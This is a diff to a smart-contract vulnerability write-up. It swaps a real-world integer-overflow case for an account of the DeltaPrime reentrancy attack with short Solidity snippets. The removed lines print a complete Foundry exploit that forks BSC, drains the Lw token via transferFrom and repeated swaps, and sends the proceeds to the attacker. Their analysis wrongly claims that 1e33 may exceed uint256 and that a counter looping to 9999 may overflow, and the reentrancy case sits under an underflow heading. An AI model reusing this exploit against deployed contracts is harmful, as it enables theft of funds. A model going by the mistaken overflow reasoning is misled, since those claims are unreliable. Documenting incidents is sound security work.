@@ -28,91 +28,42 @@ contract UnderflowExample {
 
 
 ## Real-World Example
-Date Identified: 08/07/2024
+On November 11, 2024, the DeltaPrime smart contract suffered a reentrancy attack, resulting in a loss of approximately $4.75M USD. The attacker exploited a vulnerability in the contract's reward claiming mechanism, which lacked proper checks to prevent reentrancy during the execution of flash loans and reward claims. By leveraging a fake pair contract, the attacker manipulated the smart loan's behavior to repeatedly claim rewards and convert collateral into WETH (Wrapped Ether) without proper validation. This exploit highlights the critical need for implementing reentrancy guards and thorough validation mechanisms in sensitive contract functions. In the following sections, we will highlight the specific vulnerable points in this contract.
 
-Lost: ~7K USD
+- Reentrancy via call to attackContract
+The claim function in the FakePairContract calls attackContract using call. This low-level function provides no checks or restrictions, enabling the attacker to execute arbitrary code. In this case, the attacker leverages the convertETH function from the DeltaPrimeExp contract during the reward claim process. Since the claim function does not employ a reentrancy guard (e.g., nonReentrant), the attacker can reenter the function multiple times within the same transaction. This allows them to repeatedly manipulate the state of the contract and claim rewards in an unintended manner.
+```Solidity
+function claim(address user, uint256[] calldata ids) external {
+    // : Allows reentrancy by calling the exploit's convertETH function.
+    attackContract.call(abi.encodeWithSelector(DeltaPrimeExp.convertETH.selector, ""));
+}
 
-Highlighted Line: Lw.transferFrom(address(Lw), address(this), 1_000_000_000_000_000_000_000_000_000_000_000);
+```
+- Chaining Reentrant Calls
+The attacker utilizes reentrant calls to manipulate the collateral conversion process repeatedly. By calling the convertETH function from within the claim function, they withdraw WETH and convert it into ETH. This process is repeated, draining the contract of its assets before the state updates or checks can finalize. The vulnerability lies in the lack of a mechanism to ensure that the claim function can only be executed once per transaction.
+
+- Flash Loan Exploitation
+The attacker initiates the exploit with a large flash loan using the flashLoan function from Balancer. This provides the liquidity required to begin the exploit and manipulate the reward and collateral mechanisms. After the exploit completes, the attacker repays the flash loan, extracting the stolen assets as profit. For instance:
+
+```Solidity
+Balancer.flashLoan(address(this), tokens, amounts, userData);
+```
  
-•	Potential Integer Overflow:
-o	The value 1_000_000_000_000_000_000_000_000_000_000_000 is extremely large and could exceed the storage capacity of uint256, especially if the Lw contract does not implement overflow protection.
-o	If the Lw contract is written in an older version of Solidity (prior to 0.8.0) or does not use a library like SafeMath, it may allow an overflow to occur, causing the value to "wrap around" to a smaller number, effectively bypassing intended limits.
+- Unchecked Collateral Conversion
+The convertETH function plays a critical role in the exploit. By calling it repeatedly, the attacker converts the collateral into WETH, which is then claimed as a reward. The collateral is continuously manipulated without proper validation of balances or limits:
 
-Highlighted Line: while (i < 9999) {
-    swap_token_to_token(address(Lw), address(BUSDT), 800_000_000 ether);
-    i++;
-}
- 
-•	Risk of Integer Overflow on i:
-o	The variable i is incremented in a loop up to 9999 iterations. If there is an overflow in i (e.g., if i exceeds uint256 storage capacity), the loop may behave unexpectedly, causing unintended or infinite execution.
-•	Potential Overflow in Token Amount:
-o	The value 800_000_000 ether is passed to the swap_token_to_token function. If this value is further processed in the Lw or BUSDT contracts without overflow protection, it could result in unintended behavior or manipulation of balances.
+```Solidity
+address(SmartLoan).call(wrapNativeTokenData);
+```
 
-Below is the smart contract used in the exploitation of the identified vulnerabilities [3].
-```Solidity 
-pragma solidity ^0.8.10;
+- Draining WETH Balance
+After completing the reentrant calls, the attacker transfers the WETH balance to the Balancer flash loan pool to finalize the flash loan repayment:
 
-import "forge-std/Test.sol";
-import "./../interface.sol";
+```Solidity
+WETH.transfer(address(Balancer), flashLoanAmount);
+```
+This step ensures that the attacker extracts the profit without leaving any traceable balance within the vulnerable contract.
 
-// @KeyInfo -- Total Lost : ~7K USD
-// TX : https://app.blocksec.com/explorer/tx/bsc/0x96a955304fed48a8fbfb1396ec7658e7dc42b7c140298b80ce4206df34f40e8d
-// Attacker : https://bscscan.com/address/0x56b2d55457b31fb4b78ebddd6718ea2667804a06
-// Attack Contract : https://bscscan.com/address/0xfe7e9c76affdba7b7442adaca9c7c059ec3092fc
-// GUY : https://x.com/0xNickLFranklin/status/1810245893490368820
-
-contract Exploit is Test {
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IERC20 Lw = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
-    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    address Hackcontract;
-
-    function setUp() external {
-        cheats.createSelectFork("bsc", 40_287_544);
-        deal(address(BUSDT), address(this), 0);
-    }
-
-    function testExploit() external {
-        emit log_named_decimal_uint("[Begin] Attacker BUSDT before exploit", BUSDT.balanceOf(address(this)), 18);
-        Money Hackcontract = new Money();
-        emit log_named_decimal_uint("[End] Attacker BUSDT after exploit", BUSDT.balanceOf(address(this)), 18);
-    }
-}
-
-contract Money is Test {
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IPancakePair Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
-    IERC20 Lw = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
-    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    address owner;
-
-    constructor() {
-        owner = msg.sender;
-        Attack();
-    }
-
-    function Attack() public {
-        Lw.transferFrom(address(Lw), address(this), 1_000_000_000_000_000_000_000_000_000_000_000);
-        uint256 i = 0;
-        while (i < 9999) {
-            swap_token_to_token(address(Lw), address(BUSDT), 800_000_000 ether);
-            i++;
-        }
-        BUSDT.transfer(msg.sender, BUSDT.balanceOf(address(this)));
-    }
-
-    function swap_token_to_token(address a, address b, uint256 amount) internal {
-        IERC20(a).approve(address(router), type(uint256).max);
-        address[] memory path = new address[](2);
-        path[0] = address(a);
-        path[1] = address(b);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
-    }
-}
-``` 
 ## References 
 [1] Huashan Chen, Marcus Pendleton, Laurent Njilla, and Shouhuai Xu. A survey on ethereum systems security: Vulnerabilities, attacks, and defenses.
 ACM Computing Surveys (CSUR), 53(3):1–43, 2020.
